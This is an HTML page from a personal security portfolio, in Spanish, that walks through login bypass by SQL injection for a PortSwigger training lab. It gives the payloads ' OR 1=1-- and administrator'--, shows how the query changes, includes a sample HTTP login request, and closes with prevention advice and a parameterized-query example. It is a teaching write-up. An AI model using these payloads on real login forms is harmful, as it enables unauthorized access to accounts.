@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bypass de Login mediante SQL Injection | Laboratorios SQL Injection</title>
+    <link rel="shortcut icon" href="../../imagenes/github.svg" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../../css/style.css">
+    <style>
+        .article-content {
+            padding: 120px 0;
+        }
+        
+        .article-header {
+            margin-bottom: 40px;
+        }
+        
+        .article-title {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: var(--accent);
+        }
+        
+        .article-meta {
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .article-meta span {
+            margin-right: 20px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .article-meta i {
+            margin-right: 8px;
+            color: var(--accent);
+        }
+        
+        .article-body {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        
+        .article-body h2 {
+            font-size: 1.8rem;
+            margin: 40px 0 20px;
+            color: var(--accent);
+        }
+        
+        .article-body h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px;
+        }
+        
+        .article-body p {
+            margin-bottom: 20px;
+            line-height: 1.8;
+            color: var(--text-secondary);
+        }
+        
+        .article-body pre {
+            background-color: var(--secondary);
+            padding: 20px;
+            border-radius: 5px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border-left: 4px solid var(--accent);
+        }
+        
+        .article-body code {
+            font-family: 'Courier New', monospace;
+            color: var(--accent);
+        }
+        
+        .article-body ul, .article-body ol {
+            margin: 20px 0;
+            padding-left: 20px;
+            color: var(--text-secondary);
+        }
+        
+        .article-body li {
+            margin-bottom: 10px;
+        }
+        
+        .diagram {
+            background-color: var(--secondary);
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .diagram img {
+            max-width: 100%;
+            border-radius: 5px;
+        }
+        
+        .caption {
+            color: var(--text-secondary);
+            font-style: italic;
+            margin-top: 10px;
+            text-align: center;
+        }
+        
+        .info-box {
+            background-color: rgba(100, 255, 218, 0.1);
+            border-left: 4px solid var(--accent);
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        
+        .info-box h4 {
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+        
+        .breadcrumb {
+            display: flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: var(--text-secondary);
+        }
+        
+        .breadcrumb a {
+            color: var(--accent);
+            text-decoration: none;
+        }
+        
+        .breadcrumb span {
+            margin: 0 10px;
+        }
+        
+        @media (max-width: 768px) {
+            .article-title {
+                font-size: 2rem;
+            }
+            
+            .article-meta span {
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <nav>
+                <div class="logo">Daniel Béjar</div>
+                <ul class="nav-links">
+                    <li><a href="../../index.html#about">Sobre mí</a></li>
+                    <li><a href="../../index.html#projects">Proyectos</a></li>
+                    <li><a href="index.html" class="active">SQLi Labs</a></li>
+                </ul>
+                <button class="menu-btn" id="menuBtn">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Article Content -->
+    <section class="article-content">
+        <div class="container">
+            <div class="breadcrumb">
+                <a href="../../index.html">Inicio</a>
+                <span>/</span>
+                <a href="index.html">Laboratorios SQL Injection</a>
+                <span>/</span>
+                <span>Bypass de Login</span>
+            </div>
+            
+            <div class="article-header">
+                <h1 class="article-title">Bypass de Login mediante Inyección SQL</h1>
+                <div class="article-meta">
+                    <span><i class="fas fa-tag"></i> SQL Injection</span>
+                    <span><i class="fas fa-clock"></i> 10 min de lectura</span>
+                    <span><i class="fas fa-calendar"></i> 18 Julio 2025</span>
+                </div>
+            </div>
+            
+            <div class="article-body">
+                <h2>Introducción</h2>
+                <p>
+                    El bypass de login mediante inyección SQL es una técnica que permite a un atacante eludir los mecanismos
+                    de autenticación de una aplicación web sin conocer las credenciales válidas. Esta vulnerabilidad ocurre
+                    cuando la aplicación construye consultas SQL de forma insegura al verificar las credenciales de usuario.
+                </p>
+                
+                <div class="info-box">
+                    <h4>Contexto del laboratorio</h4>
+                    <p>
+                        Este laboratorio contiene una vulnerabilidad de inyección SQL en el formulario de login. La aplicación
+                        ejecuta una consulta SQL para verificar las credenciales del usuario, pero no sanitiza correctamente
+                        la entrada del usuario.
+                    </p>
+                </div>
+                
+                <h2>Funcionamiento de la vulnerabilidad</h2>
+                <p>
+                    Cuando un usuario intenta iniciar sesión, la aplicación ejecuta una consulta similar a esta:
+                </p>
+                
+                <pre><code>SELECT * FROM users WHERE username = 'input_username' AND password = 'input_password'</code></pre>
+                
+                <p>
+                    Si la consulta devuelve algún resultado, la aplicación permite el acceso. Un atacante puede manipular
+                    la entrada para modificar la consulta y eludir la autenticación.
+                </p>
+                
+                <h2>Explotación de la vulnerabilidad</h2>
+                <p>
+                    Para bypassear el login, un atacante puede utilizar el payload <code>' OR 1=1--</code> en el campo de contraseña:
+                </p>
+                
+                <pre><code>Usuario: administrator
+Contraseña: test' OR 1=1--</code></pre>
+                
+                <p>
+                    Esto modifica la consulta SQL de la siguiente manera:
+                </p>
+                
+                <pre><code>SELECT * FROM users WHERE username = 'administrator' AND password = 'test' OR 1=1--'</code></pre>
+                
+                <p>
+                    La condición <code>OR 1=1</code> siempre es verdadera, por lo que la consulta devolverá todos los usuarios
+                    de la tabla, permitiendo el acceso como el primer usuario (normalmente el administrador).
+                </p>
+                
+                <div class="diagram">
+                    <svg width="100%" height="250" xmlns="http://www.w3.org/2000/svg">
+                        <rect x="50" y="30" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="55" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Consulta SQL Original</text>
+                        
+                        <rect x="50" y="100" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="125" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Consulta SQL Modificada</text>
+                        
+                        <path d="M200 70L200 100" stroke="#64ffda" stroke-width="2" />
+                        <polygon points="200,70 195,80 205,80" fill="#64ffda" />
+                        
+                        <text x="360" y="125" text-anchor="start" fill="#8892b0" font-family="Arial, sans-serif" font-size="12">OR 1=1--'</text>
+                        <text x="360" y="140" text-anchor="start" fill="#8892b0" font-family="Arial, sans-serif" font-size="12">(condición siempre verdadera)</text>
+                        
+                        <rect x="50" y="170" width="300" height="40" fill="#112240" stroke="#64ffda" stroke-width="2" rx="5" />
+                        <text x="200" y="195" text-anchor="middle" fill="#64ffda" font-family="Arial, sans-serif" font-size="14">Resultado: Acceso concedido</text>
+                        
+                        <path d="M200 140L200 170" stroke="#64ffda" stroke-width="2" />
+                        <polygon points="200,140 195,150 205,150" fill="#64ffda" />
+                    </svg>
+                    <p class="caption">Figura 1: Bypass de autenticación mediante inyección SQL</p>
+                </div>
+                
+                <h2>Variantes de la técnica</h2>
+                <p>
+                    Existen varias variantes de esta técnica dependiendo de la configuración de la base de datos:
+                </p>
+                
+                <h3>MySQL y PostgreSQL</h3>
+                <pre><code>Usuario: administrator'--
+Contraseña: [cualquier valor]</code></pre>
+                
+                <h3>Oracle</h3>
+                <pre><code>Usuario: administrator'--
+Contraseña: [cualquier valor]</code></pre>
+                
+                <h3>Microsoft SQL Server</h3>
+                <pre><code>Usuario: administrator'--
+Contraseña: [cualquier valor]</code></pre>
+                
+                <div class="info-box">
+                    <h4>Precaución</h4>
+                    <p>
+                        Al explotar esta vulnerabilidad, es importante considerar que algunas aplicaciones pueden realizar
+                        comprobaciones adicionales, como verificar que solo se devuelva un único usuario. En estos casos,
+                        se pueden utilizar técnicas más específicas.
+                    </p>
+                </div>
+                
+                <h2>Solución del laboratorio</h2>
+                <p>
+                    Para resolver el laboratorio "SQL injection vulnerability allowing login bypass" de PortSwigger:
+                </p>
+                
+                <ol>
+                    <li>Acceda al formulario de login de la aplicación.</li>
+                    <li>Introduzca <code>administrator'--</code> en el campo de usuario.</li>
+                    <li>Introduzca cualquier valor en el campo de contraseña.</li>
+                    <li>Inicie sesión y verifique que tiene acceso como administrador.</li>
+                </ol>
+                
+                <h3>Ejemplo de solicitud HTTP</h3>
+                <pre><code>POST /login HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+
+username=administrator'--&password=anypassword</code></pre>
+                
+                <h2>Medidas de prevención</h2>
+                <p>
+                    Para prevenir vulnerabilidades de bypass de login mediante inyección SQL, se recomienda:
+                </p>
+                
+                <ul>
+                    <li>Utilizar consultas parametrizadas (prepared statements) para todas las operaciones de base de datos.</li>
+                    <li>Validar y sanitizar todas las entradas del usuario.</li>
+                    <li>Implementar el principio de mínimo privilegio para cuentas de base de datos.</li>
+                    <li>Utilizar funciones de hash seguras para almacenar contraseñas.</li>
+                    <li>Implementar mecanismos de bloqueo después de múltiples intentos fallidos de login.</li>
+                </ul>
+                
+                <div class="info-box">
+                    <h4>Consulta parametrizada ejemplo</h4>
+                    <pre><code>// Ejemplo en Java con PreparedStatement
+String username = request.getParameter("username");
+String password = request.getParameter("password");
+String query = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement stmt = connection.prepareStatement(query);
+stmt.setString(1, username);
+stmt.setString(2, password);
+ResultSet rs = stmt.executeQuery();</code></pre>
+                </div>
+                
+                <h2>Conclusión</h2>
+                <p>
+                    El bypass de login mediante inyección SQL es una vulnerabilidad crítica que puede permitir a atacantes
+                    acceder a cuentas privilegiadas sin conocer las credenciales. Es esencial implementar medidas de seguridad
+                    adecuadas en todos los formularios de autenticación para prevenir este tipo de ataques.
+                </p>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="social-links">
+                <a href="https://github.com/Daniel-Bejar"><i class="fab fa-github"></i></a>
+                <a href="https://www.linkedin.com/in/daniel-béjar-a91713206"><i class="fab fa-linkedin"></i></a>
+                <a href="https://hackerone.com/doniti?type=user"><i class="fab fa-hackerrank"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <script src="../../js/script.js"></script>
+</body>
+</html>
